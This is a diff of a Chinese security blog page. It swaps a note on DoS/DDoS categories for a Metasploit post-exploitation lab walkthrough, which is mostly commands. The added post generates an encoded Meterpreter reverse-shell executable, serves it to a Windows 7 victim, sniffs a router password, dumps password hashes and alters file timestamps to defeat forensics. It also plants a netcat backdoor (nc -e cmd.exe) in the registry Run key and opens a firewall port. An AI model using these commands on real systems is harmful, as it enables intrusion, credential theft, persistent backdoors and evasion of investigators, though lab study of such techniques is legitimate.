@@ -79,20 +79,16 @@
 
 
 
-<meta name="description" content="1. 拒绝服务 DoS不是DOS 利用程序漏洞少量请求或一对一资源耗尽的Denial of Service拒绝服务   DDoS分布式拒绝服务 一对一的攻击完全拼各自的资源，效果差 多对一的攻击汇聚资源能力，重点在于量大，属于资源耗尽型   历史 以前：欠缺技术能力的无赖，我ping死你（最难缠的无赖） 现在：最强大最危险的攻击，攻击方式众多（专业化的要求勒索） 电商网站被勒索，Bill gat">
+<meta name="description" content="1. 实验环境 Window 7 网卡模式为Bridge模式，检查网络，🔺命令：ifconfig 查看IP地址 关闭防火墙，关闭UAC并重启   Kali 网卡模式为Bridge模式，检查网络，🔺命令：ifconfig 查看IP地址 🔺命令：msfvenom -a x86 --platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST">
 <meta name="keywords" content="安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali Linux笔记(七十七)：DoS介绍及分类">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;03&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B8%83)%EF%BC%9ADoS%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%86%E7%B1%BB&#x2F;index.html">
+<meta property="og:title" content="Kali Linux笔记(一百零九)：MSF后渗透测试--信息收集+后门">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;03&#x2F;03&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B9%9D)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86+%E5%90%8E%E9%97%A8&#x2F;index.html">
 <meta property="og:site_name" content="Tomas&#39;Blog">
-<meta property="og:description" content="1. 拒绝服务 DoS不是DOS 利用程序漏洞少量请求或一对一资源耗尽的Denial of Service拒绝服务   DDoS分布式拒绝服务 一对一的攻击完全拼各自的资源，效果差 多对一的攻击汇聚资源能力，重点在于量大，属于资源耗尽型   历史 以前：欠缺技术能力的无赖，我ping死你（最难缠的无赖） 现在：最强大最危险的攻击，攻击方式众多（专业化的要求勒索） 电商网站被勒索，Bill gat">
+<meta property="og:description" content="1. 实验环境 Window 7 网卡模式为Bridge模式，检查网络，🔺命令：ifconfig 查看IP地址 关闭防火墙，关闭UAC并重启   Kali 网卡模式为Bridge模式，检查网络，🔺命令：ifconfig 查看IP地址 🔺命令：msfvenom -a x86 --platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=cc69C-pmvobPxOEeSXQbCu7gJ7XWfinlg5u1AO7r8LXCdjrpOKpgzl2iLn5eGfNYfC2gcQVdIavpZf1ypTF3DUoYHgckdPti8gFH4LNgwRizkij4x2f5tt3G&amp;file_name=&#x2F;%E5%8C%BF%E5%90%8D%E8%80%85.PNG">
-<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=abc2y5RcuHZuXlXIOBS6HhY1tgLVCry_GYF-1wxkzVe5gI3gjwRkLoVJzfKNv3Qkicb0ycN2gnU4ADne6Tu97uyzBGNQNskMioWKdLVXV1PeBDpblInx2Lvj&amp;file_name=&#x2F;Dos%E9%93%BE%E8%B7%AF.PNG">
-<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=60c2T5xZxwJxsYvT3Ae2wYbDxYXkIh92SmJnFPU_uKvtTgxMZz9MwQTQIUKjzqs3SGN4NGQIrn5C2q7ZF5FfJEDZ3KH0MjMQMjpiGxM6j5lf5TA7rPQ5bLWZPQ&amp;file_name=&#x2F;DDoS%E5%88%86%E7%B1%BB.PNG">
-<meta property="og:updated_time" content="2020-02-07T05:33:47.516Z">
+<meta property="og:updated_time" content="2020-03-03T07:14:42.081Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=cc69C-pmvobPxOEeSXQbCu7gJ7XWfinlg5u1AO7r8LXCdjrpOKpgzl2iLn5eGfNYfC2gcQVdIavpZf1ypTF3DUoYHgckdPti8gFH4LNgwRizkij4x2f5tt3G&amp;file_name=&#x2F;%E5%8C%BF%E5%90%8D%E8%80%85.PNG">
 
 
 
@@ -122,13 +118,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/02/03/Kali Linux笔记(七十七)：DoS介绍及分类/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/03/03/Kali Linux笔记(一百零九)：MSF后渗透测试--信息收集+后门/"/>
 
 
 
 
 
-  <title>Kali Linux笔记(七十七)：DoS介绍及分类 | Tomas'Blog</title>
+  <title>Kali Linux笔记(一百零九)：MSF后渗透测试--信息收集+后门 | Tomas'Blog</title>
   
 
 
@@ -247,7 +243,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B8%83)%EF%BC%9ADoS%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%86%E7%B1%BB/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B9%9D)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86+%E5%90%8E%E9%97%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Tomas">
@@ -264,7 +260,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(七十七)：DoS介绍及分类</h1>
+          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(一百零九)：MSF后渗透测试--信息收集+后门</h1>
         
 
         <div class="post-meta">
@@ -276,8 +272,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-03T20:06:41+08:00">
-                2020-02-03
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-03T15:35:04+08:00">
+                2020-03-03
               </time>
             
 
@@ -330,7 +326,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  607 字
+                  988 字
                 </span>
               
 
@@ -346,7 +342,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2 分钟
+                  4 分钟
                 </span>
               
             </div>
@@ -368,85 +364,171 @@
 
       
         <hr>
-<h4 id="1-拒绝服务"><a href="#1-拒绝服务" class="headerlink" title="1. 拒绝服务"></a>1. 拒绝服务</h4><ul>
-<li>DoS不是DOS<ul>
-<li>利用程序漏洞少量请求或一对一资源耗尽的Denial of Service拒绝服务</li>
+<h4 id="1-实验环境"><a href="#1-实验环境" class="headerlink" title="1. 实验环境"></a>1. 实验环境</h4><ul>
+<li>Window 7<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong> 查看IP地址</li>
+<li>关闭防火墙，关闭UAC并重启</li>
 </ul>
 </li>
-<li>DDoS分布式拒绝服务<ul>
-<li>一对一的攻击完全拼各自的资源，效果差</li>
-<li>多对一的攻击汇聚资源能力，重点在于量大，属于资源耗尽型</li>
-</ul>
-</li>
-<li>历史<ul>
-<li>以前：欠缺技术能力的无赖，我ping死你（最难缠的无赖）</li>
-<li>现在：最强大最危险的攻击，攻击方式众多（专业化的要求勒索）<ul>
-<li>电商网站被勒索，Bill gates僵尸程序</li>
-<li>贩卖和租用肉鸡已经称为黑产中重要的一部分</li>
-<li>最终的办法就是拼资源，投资抗D，或者乖乖交保护费</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Anonymous匿名者<ul>
-<li>世界最著名的黑客组织</li>
-<li>组织结构宽松，人员来自世界各地</li>
-<li>以DDoS攻击著称的无政府主义者</li>
-<li>亦正亦邪，攻击恐怖组织也攻击政府宗教机构</li>
-<li>近些年来涉足政治斗争</li>
-<li>成员露面时均带有Guy Fawkes面具</li>
-<li>最早的核心成员来自4chan图片社区</li>
-<li>惯常雇佣外围黑客成员发动DDoS</li>
-<li>口号：<ul>
-<li>We are Anonymous,We are a Legion,We do not forgive,We do not forget,<br>Expect us.</li>
+<li>Kali<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong> 查看IP地址</li>
+<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong> </li>
+<li><strong><code>🔺命令：service apache2 start</code></strong> </li>
+<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong> </li>
+<li><strong><code>🔺命令：msfconsole -q</code></strong> </li>
+<li><strong><code>🔺命令：use exploit/multi/handler</code></strong> <ul>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong> <ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
+<li><strong><code>🔺命令：exploit</code></strong> </li>
 </ul>
 </li>
 </ul>
 </li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=cc69C-pmvobPxOEeSXQbCu7gJ7XWfinlg5u1AO7r8LXCdjrpOKpgzl2iLn5eGfNYfC2gcQVdIavpZf1ypTF3DUoYHgckdPti8gFH4LNgwRizkij4x2f5tt3G&file_name=/%E5%8C%BF%E5%90%8D%E8%80%85.PNG" alt="Anonymous匿名者"></p>
-<h4 id="2-DoS分类"><a href="#2-DoS分类" class="headerlink" title="2. DoS分类"></a>2. DoS分类</h4><ul>
-<li>D网络<ul>
-<li>基于巨量的Flood耗尽目标网络带宽资源（打掉服务器的出口带宽）</li>
-<li>ICMP Flood、UDP Flood</li>
+</li>
+<li>Window 7<ul>
+<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
+<li>双击打开1.exe</li>
 </ul>
 </li>
-<li>D协议<ul>
-<li>攻击协议漏洞发起的拒绝服务攻击</li>
-<li>如Syn Flood、Ping of Death、ARP、DNS、802.11、SSL</li>
-<li>▲ Syn → Syn/Ack → ACK（服务器一直等待最后的ACK导致DoS）</li>
-<li>▲ ARP（基于传闻的协议，发送即被接受）</li>
-</ul>
-</li>
-<li>D应用<ul>
-<li>针对应用软件和操作系统漏洞发起的拒绝服务攻击</li>
-<li>大量频繁访问消耗系统资源严重的应用（CC）</li>
-<li>通常表现为操作系统运行正常，网络流量不大，但服务停止响应</li>
-<li>可以是一击毙命的，也可以是耗尽目标资源的</li>
+<li>Kali<ul>
+<li>查看是否拿到shell</li>
 </ul>
 </li>
 </ul>
-<h4 id="3-为何被DoS"><a href="#3-为何被DoS" class="headerlink" title="3. 为何被DoS"></a>3. 为何被DoS</h4><ul>
-<li>从攻击者到被害者<ul>
-<li>网络（网络设备等）→ FireWall → 服务器OS → 服务应用</li>
+<h4 id="2-抓包（metrepreter）"><a href="#2-抓包（metrepreter）" class="headerlink" title="2. 抓包（metrepreter）"></a>2. 抓包（metrepreter）</h4><ul>
+<li>在内存中缓存区块循环存储抓包（50000包），不写硬盘</li>
+<li>智能过来meterpreter流量，传输全程使用SSL/TLS加密</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：load sniffer</code></strong> <ul>
+<li><strong><code>🔺命令：sniffer_interfaces</code></strong>  </li>
+<li><strong><code>🔺命令：sniffer_start 2</code></strong>  </li>
+<li><strong><code>🔺命令：sniffer_dump 2 1.cap</code></strong>  </li>
 </ul>
 </li>
-<li>资源耗尽<ul>
-<li>网络：带宽</li>
-<li>Firewall：吞吐量、并发连接</li>
-<li>服务器：CPU、内存、I/O</li>
-<li>应用：处理请求能力、对OS资源的使用权</li>
 </ul>
 </li>
-<li>程序漏洞攻击<ul>
-<li>缓冲区溢出</li>
-<li>协议、程序逻辑漏洞</li>
+<li>Window 7<ul>
+<li>浏览器访问路由器，输入密码</li>
 </ul>
 </li>
-<li>链路上任何一点都可成为目标</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：sniffer_dump 2 2.cap</code></strong> （含有密码信息）</li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=abc2y5RcuHZuXlXIOBS6HhY1tgLVCry_GYF-1wxkzVe5gI3gjwRkLoVJzfKNv3Qkicb0ycN2gnU4ADne6Tu97uyzBGNQNskMioWKdLVXV1PeBDpblInx2Lvj&file_name=/Dos%E9%93%BE%E8%B7%AF.PNG" alt="DoS链路"></p>
-<h4 id="4-DDoS分类方法"><a href="#4-DDoS分类方法" class="headerlink" title="4. DDoS分类方法"></a>4. DDoS分类方法</h4><p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=60c2T5xZxwJxsYvT3Ae2wYbDxYXkIh92SmJnFPU_uKvtTgxMZz9MwQTQIUKjzqs3SGN4NGQIrn5C2q7ZF5FfJEDZ3KH0MjMQMjpiGxM6j5lf5TA7rPQ5bLWZPQ&file_name=/DDoS%E5%88%86%E7%B1%BB.PNG" alt="DDoS分类方法"></p>
+</li>
+</ul>
+<h4 id="3-解码"><a href="#3-解码" class="headerlink" title="3. 解码"></a>3. 解码</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：use auxiliary/sniffer/psnuffle</code></strong> </li>
+<li><strong><code>🔺命令：set PCAPFILE /root/2.cap</code></strong> </li>
+<li><strong><code>🔺命令：run</code></strong> </li>
+</ul>
+</li>
+</ul>
+<h4 id="4-搜索文件（meterpreter）"><a href="#4-搜索文件（meterpreter）" class="headerlink" title="4. 搜索文件（meterpreter）"></a>4. 搜索文件（meterpreter）</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：search -f *.ini</code></strong>  </li>
+<li><strong><code>🔺命令：search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.docx</code></strong> </li>
+</ul>
+</li>
+</ul>
+<h4 id="5-John-the-Ripper破解弱口令"><a href="#5-John-the-Ripper破解弱口令" class="headerlink" title="5. John the Ripper破解弱口令"></a>5. John the Ripper破解弱口令</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：use post/windows/gather/hashdump</code></strong>   #system权限的meterpreter<ul>
+<li><strong><code>🔺命令：set session sessionID</code></strong> </li>
+<li><strong><code>🔺命令：run</code></strong>   #结果保存在/tmp目录下</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：use auxiliary/analyze/jtr_crack_fast</code></strong> <ul>
+<li><strong><code>🔺命令：run</code></strong> </li>
+</ul>
+</li>
+<li>▲ 2020.03.03 暂无jtr_crack_fast此模块</li>
+</ul>
+</li>
+</ul>
+<h4 id="6-MAC时间"><a href="#6-MAC时间" class="headerlink" title="6. MAC时间"></a>6. MAC时间</h4><ul>
+<li>文件系统访问会留下痕迹，电子取证重点关注</li>
+<li>渗透测试和攻击者往往希望销毁文件系统访问痕迹</li>
+<li>最好的避免被电子取证发现的方法：不要碰文件系统<ul>
+<li>Meterpreter的先天优势所在（完全基于内存）</li>
+</ul>
+</li>
+<li>MAC时间（Modified / Accessed / Created）<ul>
+<li><strong><code>🔺命令：echo aaaa &gt; 1.txt</code></strong> </li>
+<li><strong><code>🔺命令：ls -l --time=atime/ctime 1.txt</code></strong> （默认的时间为modified time）</li>
+<li>列出文件的MAC时间：<strong><code>🔺命令：stat 1.txt</code></strong> </li>
+<li>修改文件的MAC时间<ul>
+<li><strong><code>🔺命令：touch -d &quot;2 days ago&quot; 1.txt</code></strong> （Created时间）</li>
+<li><strong><code>🔺命令：touch -t 1501010101 1.txt</code></strong> （Modified和Accessed时间）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>MACE：MFT entry<ul>
+<li>MFT：NTFS文件系统的主文件分配表Master File Table</li>
+<li>通常1024字节或2个硬盘扇区，其中存放多项entry信息</li>
+<li>包含文件大量信息（大小、名称、目录位置、磁盘位置、创建时间）</li>
+<li>更多信息可研究文件系统取证分析技术</li>
+<li>▲ 可通过修改文件名称来查看E的变化</li>
+</ul>
+</li>
+</ul>
+<h4 id="7-Timestomp（meterpreter）"><a href="#7-Timestomp（meterpreter）" class="headerlink" title="7. Timestomp（meterpreter）"></a>7. Timestomp（meterpreter）</h4><ul>
+<li>Kali<ul>
+<li>timestomp参数<ul>
+<li>-v：显示详细MAC时间</li>
+<li>-f：指定模板文件时间作为复制</li>
+<li>-b -r（递归擦除）：擦除MAC时间信息，目前此参数功能失效</li>
+<li>-a/-c/-m/-e：修改MACE的A/C/M/E参数的时间</li>
+<li>-z：修改MACE的所有参数的时间</li>
+</ul>
+</li>
+<li>▲ EnCase工具在电子取证中很出名</li>
+<li><strong><code>🔺命令：timestomp -v 1.txt</code></strong>  </li>
+<li><strong><code>🔺命令：timestomp -f c:\\autoexec.bat 1.txt</code></strong> </li>
+<li><strong><code>🔺命令：timestomp -z &quot;MM/DD/YYYY HH24:MI:SS&quot;  2.txt</code></strong> </li>
+</ul>
+</li>
+</ul>
+<h4 id="8-用注册表添加NC后门服务、打开防火墙端口（meterpreter）"><a href="#8-用注册表添加NC后门服务、打开防火墙端口（meterpreter）" class="headerlink" title="8. 用注册表添加NC后门服务、打开防火墙端口（meterpreter）"></a>8. 用注册表添加NC后门服务、打开防火墙端口（meterpreter）</h4><ul>
+<li>注册表保存着windows几乎全部配置参数<ul>
+<li>如果修改不当，可直接造成系统崩溃</li>
+<li>修改前完整备份注册表</li>
+<li>某些注册表的修改是不可逆的</li>
+</ul>
+</li>
+<li>常见用途<ul>
+<li>修改、增加启动项</li>
+<li>窃取存储于注册表中的机密信息</li>
+<li>绕过文件型病毒查杀</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32</code></strong> </li>
+<li>查看Window 7系统启动程序：<strong><code>🔺命令：reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</code></strong>  </li>
+<li>在查看的主键在新建监制：<strong><code>🔺命令：reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#39;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&#39;</code></strong> </li>
+<li><strong><code>🔺命令：reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</code></strong> </li>
+<li><strong><code>🔺命令：execute -f cmd -i -H</code></strong>  </li>
+<li><strong><code>🔺命令：netsh firewall show opmode</code></strong>  </li>
+<li><strong><code>🔺命令：netsh firewall add portopening TCP 4444 &quot;test&quot; ENABLE ALL</code></strong>  </li>
+<li><strong><code>🔺命令：shutdown -r -t 0</code></strong>  </li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li><strong><code>🔺命令：netstat -nao</code></strong> 查看是否开启了4444端口</li>
+<li><strong><code>🔺命令：tasklist</code></strong> 查看进程的PID</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：nc Kali的IP 4444</code></strong> </li>
+</ul>
+</li>
+<li>其他注册表项<ul>
+<li><a href="https://support.accessdata.com/hc/en-us/articles/204448155-RegistryQuick-Find-Chart" target="_blank" rel="noopener">https://support.accessdata.com/hc/en-us/articles/204448155-RegistryQuick-Find-Chart</a></li>
+</ul>
+</li>
+</ul>
 
       
     </div>
@@ -477,8 +559,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%B0%81%E8%A3%85TCP%E6%B5%81%E9%87%8F%E9%9A%A7%E9%81%93--stunnel4/" rel="next" title="Kali Linux笔记(七十六)：封装TCP流量隧道--stunnel4">
-                <i class="fa fa-chevron-left"></i> Kali Linux笔记(七十六)：封装TCP流量隧道--stunnel4
+              <a href="/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AB)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Token%E6%8F%90%E6%9D%83/" rel="next" title="Kali Linux笔记(一百零八)：MSF后渗透测试--Token提权">
+                <i class="fa fa-chevron-left"></i> Kali Linux笔记(一百零八)：MSF后渗透测试--Token提权
               </a>
             
           </div>
@@ -486,10 +568,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%85%AB)%EF%BC%9ATCP%E8%BF%9E%E6%8E%A5%E3%80%81IP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97/" rel="prev" title="Kali Linux笔记(七十八)：TCP连接、IP地址欺骗">
-                Kali Linux笔记(七十八)：TCP连接、IP地址欺骗 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -659,7 +737,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-拒绝服务"><span class="nav-number">1.</span> <span class="nav-text">1. 拒绝服务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-DoS分类"><span class="nav-number">2.</span> <span class="nav-text">2. DoS分类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-为何被DoS"><span class="nav-number">3.</span> <span class="nav-text">3. 为何被DoS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-DDoS分类方法"><span class="nav-number">4.</span> <span class="nav-text">4. DDoS分类方法</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-实验环境"><span class="nav-number">1.</span> <span class="nav-text">1. 实验环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-抓包（metrepreter）"><span class="nav-number">2.</span> <span class="nav-text">2. 抓包（metrepreter）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-解码"><span class="nav-number">3.</span> <span class="nav-text">3. 解码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-搜索文件（meterpreter）"><span class="nav-number">4.</span> <span class="nav-text">4. 搜索文件（meterpreter）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-John-the-Ripper破解弱口令"><span class="nav-number">5.</span> <span class="nav-text">5. John the Ripper破解弱口令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-MAC时间"><span class="nav-number">6.</span> <span class="nav-text">6. MAC时间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-Timestomp（meterpreter）"><span class="nav-number">7.</span> <span class="nav-text">7. Timestomp（meterpreter）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-用注册表添加NC后门服务、打开防火墙端口（meterpreter）"><span class="nav-number">8.</span> <span class="nav-text">8. 用注册表添加NC后门服务、打开防火墙端口（meterpreter）</span></a></li></ol></div>
             
 
           </div>
